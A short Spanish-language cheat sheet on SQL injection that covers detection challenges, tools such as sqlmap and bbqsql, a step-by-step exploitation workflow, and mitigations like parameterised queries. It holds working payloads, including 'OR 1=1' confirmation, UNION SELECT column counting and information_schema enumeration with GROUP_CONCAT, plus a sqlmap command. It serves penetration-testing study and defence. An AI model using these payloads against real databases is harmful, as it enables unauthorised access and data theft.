### Resumen técnico (conciso)

**Problema**
SQLi persiste por construcciones SQL dinámicas, múltiples puntos de entrada (inputs, headers, URL) y fallas en uso correcto de consultas parametrizadas/ORM. Detectar y explotar puede requerir adaptación contextual y verificación manual.

**Retos clave**

* Consultas dinámicas y lógica compleja que ocultan vectores.
* Múltiples superficies: formularios, cabeceras (User-Agent), parámetros GET/POST.
* Falsos negativos por prepared statements/ORM; herramientas deben diferenciar.
* Blind/boolean/stacked/time-based requieren técnicas distintas y más tiempo.

**Herramientas prácticas (automación)**

* `sqlmap` — automatización general. Ejemplo:

  ```
  sqlmap -u "http://host/vuln.php?id=1" --headers="User-Agent:INJECT_HERE" --batch --dbs
  ```
* `sqlninja` — orientado a MS SQL Server (fingerprint y explotación).
* `jjtool` / `jSQL` — para entornos Java.
* `bbqsql` — blind SQLi automatizado (time/boolean).

**Flujo operativo para explotación automatizada**

1. Identificar puntos: fuzzing de parámetros, headers y rutas.
2. Confirmar inyección: `' OR '1'='1` / error messages / time delays.
3. Determinar tipo: error-based, boolean-based, time-based, stacked, UNION.
4. Contar/alinéar columnas: `ORDER BY n` / `UNION SELECT NULL,...`
5. Enumerar esquema: `information_schema.tables`, `information_schema.columns`.
6. Extraer datos con `CONCAT`, `CAST` y `GROUP_CONCAT` o mediante herramientas automáticas (`sqlmap`).
7. Si blind: usar técnicas de bit-by-bit o `bbqsql`.

**Comandos y payloads útiles**

* Confirmación básica:

  ```
  ' OR 1=1 -- -
  ```
* UNION (2 columnas):

  ```
  ' UNION SELECT NULL, column FROM table WHERE id=1 -- -
  ```
* Enumerar columnas:

  ```
  ' UNION SELECT NULL, GROUP_CONCAT(column_name SEPARATOR 0x3a) FROM information_schema.columns WHERE table_name='books' AND table_schema=DATABASE() -- -
  ```
* Forzar texto numérico:

  ```
  CAST(field AS CHAR)
  ```

**Mitigaciones esenciales**

* Consultas parametrizadas / prepared statements (no concatenar).
* Validación y normalización de entrada (whitelisting).
* Escapado específico por motor si no hay parametrización.
* Least privilege: cuentas DB con permisos mínimos.
* WAF + logging + alertas para patrones anómalos (UNION, sleep, comment markers).
* Tests automáticos en CI: integración de `sqlmap` o scanners en pipelines.

**Limitaciones y consideraciones**

* Herramientas automatizadas no sustituyen análisis manual; false positives/negatives.
* Extracción ciega es lenta; ajustar `time`/`threads` en `sqlmap`.
* Respeto legal: pruebas solo en entornos autorizados.
